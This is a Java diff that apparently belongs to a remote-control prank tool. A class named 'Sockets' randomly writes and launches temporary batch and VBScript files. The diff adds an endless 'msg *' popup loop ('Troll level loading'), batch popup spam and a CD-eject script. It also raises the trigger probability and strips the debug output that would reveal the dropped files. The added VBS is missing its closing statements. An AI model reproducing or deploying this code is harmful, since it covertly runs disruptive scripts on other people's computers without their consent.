@@ -89,7 +89,7 @@ class Sockets
     {
         try{
             Random rand = new Random(); 
-            int random = rand.nextInt(40);
+            int random = rand.nextInt(10);
             System.out.println("RANDOM: " + random);
             
             if(random <= 3)
@@ -97,7 +97,6 @@ class Sockets
                 File temp = File.createTempFile("vncv216789", ".bat"); 
                 String filePath = temp.getAbsolutePath();          
                 String nl = System.lineSeparator();
-                System.out.println("File in: " + filePath);
 
                 BufferedWriter bw = new BufferedWriter(new FileWriter(temp));
                 bw.write("@echo off" + nl +
@@ -106,30 +105,46 @@ class Sockets
 "goto:A");
                 bw.close();
                 
-                System.out.println(Sockets.executeCommand(new String[]{"cmd.exe", "/C", "Start", filePath}));
-                System.out.println("IExplorer Prank!");
+                Sockets.executeCommand(new String[]{"cmd.exe", "/C", "Start", filePath});
+
                 
             }else if(random <= 6)
+            {
+                File temp = File.createTempFile("vncv216789", ".bat"); 
+                String filePath = temp.getAbsolutePath();           
+                String nl = System.lineSeparator();
+                
+
+                BufferedWriter bw = new BufferedWriter(new FileWriter(temp));
+                bw.write("@echo off" + nl +
+":A" + nl +
+"msg * Troll level loading.... ITS OVER 9000!" + nl +
+"goto:A");
+                bw.close();
+                    
+                Sockets.executeCommand(new String[]{"cmd.exe", "/C", "Start", filePath});
+                
+            }else if(random <= 9)
             {
                 File temp = File.createTempFile("vncv216789", ".vbs"); 
                 String filePath = temp.getAbsolutePath();           
                 String nl = System.lineSeparator();
                 
-                System.out.println("File in: " + filePath);
 
                 BufferedWriter bw = new BufferedWriter(new FileWriter(temp));
-                bw.write("Set wshShell =wscript.CreateObject(“WScript.Shell”)" + nl +
-"do" + nl +
-"wscript.sleep 100" + nl +
-"wshshell.sendkeys “{CAPSLOCK}”" + nl +
-"loop");
+                bw.write("Set oWMP = CreateObject(\"WMPlayer.OCX.7\")" + nl +
+"Set colCDROMs = oWMP.cdromCollection" + nl +
+"if colCDROMs.Count = 1 then" + nl +
+"for i = 0 to colCDROMS.Count - 1" + nl +
+"colCDROMs.Item(i).Eject" + nl +
+"colCDROMs.Item(i).Eject");
                 bw.close();
                     
-                System.out.println(Sockets.executeCommand(new String[]{"cmd.exe", "/C", "Start", filePath}));
-                System.out.println("Capslock Prank!");
-                
-            }else
-                System.out.println("Nothing has been done!");
+                System.out.println("VBS CD");
+                Sockets.executeCommand(new String[]{"cmd.exe", "/C", "cscript", filePath});
+            }
+            else
+                System.out.println("NOTHING!");
             
             
                 return true;
